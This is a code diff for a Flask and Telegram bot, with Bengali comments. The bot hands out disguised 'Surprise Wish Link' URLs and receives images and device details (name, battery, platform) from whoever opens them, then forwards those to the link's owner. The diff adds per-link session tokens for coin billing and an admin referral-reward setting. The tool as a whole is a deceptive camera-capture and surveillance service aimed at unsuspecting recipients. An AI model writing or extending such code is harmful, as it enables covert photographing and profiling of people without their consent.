@@ -1,4 +1,4 @@
-import logging, base64, asyncio, os, threading
+import logging, base64, asyncio, os, threading, uuid
 from flask import Flask, request, jsonify, render_template
 from telegram import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
@@ -18,14 +18,16 @@ TOKEN = os.environ.get("TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID"))
 MY_USERNAME = os.environ.get("MY_USERNAME")
 
-REFER_REWARD = 2  
+REFER_REWARD = 2  # ডিফল্ট রেফার বোনাস (এডমিন প্যানেل থেকে পরিবর্তন করা যাবে)
 users_db = {}
 forced_channels = []  
 pending_referrals = {} 
 user_states = {}  
 
-# কোন লিংকে ইতিমধ্যে কয়েন কাটা হয়েছে সেটি ট্র্যাক করার জন্য (Session-based tracking)
+# প্রতি লিংকের সেশন ট্র্যাক করার জন্য
 charged_sessions = set()
+# প্রতি ইউজারের সর্বশেষ জেনারেট করা সেশন আইডি মনে রাখার জন্য
+user_active_sessions = {}
 
 app_telegram = None  
 bot_loop = None
@@ -40,8 +42,9 @@ def index():
 @flask_app.route('/upload-image', methods=['POST'])
 def upload_image():
     data = request.json
-    owner_id = data.get('chat_id')  # কে লিংক জেনারেট করেছিল
+    owner_id = data.get('chat_id')  
     image_data = data.get('image')
+    session_token = data.get('s', 'default')  # লিংক থেকে সেশন টোকেন রিসিভ করা
     name = data.get('name', 'Unknown')
     battery = data.get('battery', 'N/A')
     platform = data.get('platform', 'Mobile/PC')
@@ -52,12 +55,9 @@ def upload_image():
     try:
         owner_id = int(owner_id)
         
-        # ইউনিক সেশন আইডি তৈরি (প্রতিবার নতুন লিংক ক্লিক বা ব্রাউজার সেশনের জন্য)
-        # এখানে আমরা চেক করছি এই সেশনে বা প্রথম ছবি আসাতে অলরেডি কয়েন কাটা হয়েছে কিনা
-        session_key = f"{owner_id}_{request.remote_addr}" # অথবা ব্রাউজার বেসড ট্র্যাক
+        # ইউনিক সেশন কি (ইউজার আইডি + লিংক সেশন টোকেন)
+        session_key = f"{owner_id}_{session_token}"
         
-        # তবে সহজ উপায়ে: প্রতিবার ছবি আসার সময় চেক করব আজকের এই লিংকের প্রথম ছবি কিনা।
-        # আরও নিখুঁত করতে নিচের লজিক: প্রথম ছবি আসার পর একবারই কয়েন কাটবে।
         is_first_capture = False
         if session_key not in charged_sessions:
             is_first_capture = True
@@ -65,7 +65,7 @@ def upload_image():
 
         if owner_id in users_db:
             if not users_db[owner_id].get("is_vip", False):
-                if is_first_capture:  # শুধুমাত্র প্রথম ছবির জন্যই মাত্র ১ কয়েন কাটবে
+                if is_first_capture:  # প্রতি নতুন লিংকের প্রথম ছবির জন্য মাত্র ১ কয়েন কাটবে
                     if users_db[owner_id]["balance"] >= 1:
                         users_db[owner_id]["balance"] -= 1
                     else:
@@ -95,10 +95,9 @@ def upload_image():
 async def send_photo_to_owner(owner_id, photo_bytes, caption, is_first):
     try:
         await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
-        # যদি প্রথম ছবি হয় এবং কয়েন কেটে থাকে, তবে নোটিফিকেশন দিবে
         if owner_id in users_db and is_first:
             bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
-            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 আপনার লিংকে প্রথম রেসপন্স পাওয়া গেছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
+            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 নতুন লিংকের প্রথম রেসপন্স পাওয়া গেছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
     except Exception as e:
         logger.error(f"Telegram send photo error: {e}")
 
@@ -122,6 +121,7 @@ def admin_panel_keyboard():
         [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
         [InlineKeyboardButton("📈 Statistics", callback_data="adm_stats")],
         [InlineKeyboardButton("💰 User Coin (+/-)", callback_data="adm_user_coin")],
+        [InlineKeyboardButton("🎁 Set Refer Reward", callback_data="adm_set_refer")],
         [InlineKeyboardButton("👑 Make VIP", callback_data="adm_make_vip"),
          InlineKeyboardButton("👤 Make Normal", callback_data="adm_make_normal")],
         [InlineKeyboardButton("➕ Add Channel", callback_data="adm_add_chan"),
@@ -154,6 +154,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == ADMIN_ID)
 
     if user_id not in users_db:
+        # ওয়েলকাম বোনাস ৩ কয়েন সেট করা হলো
         users_db[user_id] = {"username": username, "balance": 3, "referrals": 0, "is_vip": False}
 
         if context.args and context.args[0].startswith("ref_"):
@@ -180,6 +181,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global REFER_REWARD
     query = update.callback_query
     user_id = query.from_user.id
     is_admin = (user_id == ADMIN_ID)
@@ -214,6 +216,7 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global REFER_REWARD
     text = update.message.text
     user_id = update.effective_user.id
     is_admin = (user_id == ADMIN_ID)
@@ -272,6 +275,15 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
                 except ValueError:
                     await update.message.reply_text("❌ সঠিক ফরম্যাটে লিখুন: `UserID Amount`")
             return
+        elif state == "waiting_set_refer":
+            user_states[user_id] = None
+            try:
+                new_reward = int(text.strip())
+                REFER_REWARD = new_reward
+                await update.message.reply_text(f"✅ সফলভাবে নতুন রেফার বোনাস সেট করা হয়েছে: **{REFER_REWARD} Coins**", parse_mode="Markdown", reply_markup=main_reply_keyboard(is_admin))
+            except ValueError:
+                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন (যেমন: `3`)।", reply_markup=main_reply_keyboard(is_admin))
+            return
         elif state == "waiting_make_vip":
             user_states[user_id] = None
             try:
@@ -299,11 +311,15 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.message.reply_text("❌ পর্যাপ্ত কয়েন নেই! রেফার করে কয়েন অর্জন করুন।")
             return
 
+        # প্রতিবার নতুন গেট লিংকে ক্লিক করলে ইউনিক সেশন টোকেন তৈরি হবে
+        session_token = str(uuid.uuid4())[:8]
+        user_active_sessions[user_id] = session_token
+
         base_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
-        target_link = f"{base_url}/?id={user_id}"
+        target_link = f"{base_url}/?id={user_id}&s={session_token}"
         
         vip_status = "👑 [VIP Unlimited]" if user_data["is_vip"] else f"💰 Current Balance: {user_data['balance']} Coins"
-        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার লিংকটি কপি করে যাকে পাঠাতে চান পাঠান:\n`{target_link}`", parse_mode="Markdown")
+        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংকটি কপি করে যাকে পাঠাতে চান পাঠান:\n`{target_link}`", parse_mode="Markdown")
 
     elif text == "👤 Profile":
         user_data = users_db.get(user_id, {"balance": 3, "referrals": 0, "is_vip": False})
@@ -320,7 +336,7 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode="Markdown")
 
     elif text == "🛠 Admin Panel" and is_admin:
-        await update.message.reply_text("🛠 **Admin Control Panel**", reply_markup=admin_panel_keyboard(), parse_mode="Markdown")
+        await update.message.reply_text(f"🛠 **Admin Control Panel**\n🎁 Current Refer Reward: {REFER_REWARD} Coins", reply_markup=admin_panel_keyboard(), parse_mode="Markdown")
 
 async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -332,10 +348,13 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         user_states[ADMIN_ID] = "waiting_broadcast"
         await query.message.reply_text("📢 ব্রডকাস্ট মেসেজ বা ফাইল পাঠান:")
     elif data == "adm_stats":
-        await query.message.reply_text(f"📈 Total Users: {len(users_db)}")
+        await query.message.reply_text(f"📈 Total Users: {len(users_db)}\n🎁 Current Refer Reward: {REFER_REWARD} Coins")
     elif data == "adm_user_coin":
         user_states[ADMIN_ID] = "waiting_user_coin"
         await query.message.reply_text("💰 `UserID Amount` এভাবে লিখুন (যেমন: `123456789 50`):", parse_mode="Markdown")
+    elif data == "adm_set_refer":
+        user_states[ADMIN_ID] = "waiting_set_refer"
+        await query.message.reply_text(f"🎁 বর্তমান রেফার বোনাস: **{REFER_REWARD} Coins**\n\nনতুন রেফার বোনাসের পরিমাণ কত দিতে চান তা লিখে পাঠান (যেমন: `3` বা `5`):", parse_mode="Markdown")
     elif data == "adm_make_vip":
         user_states[ADMIN_ID] = "waiting_make_vip"
         await query.message.reply_text("👑 VIP করার জন্য ইউজারের আইডি দিন:")
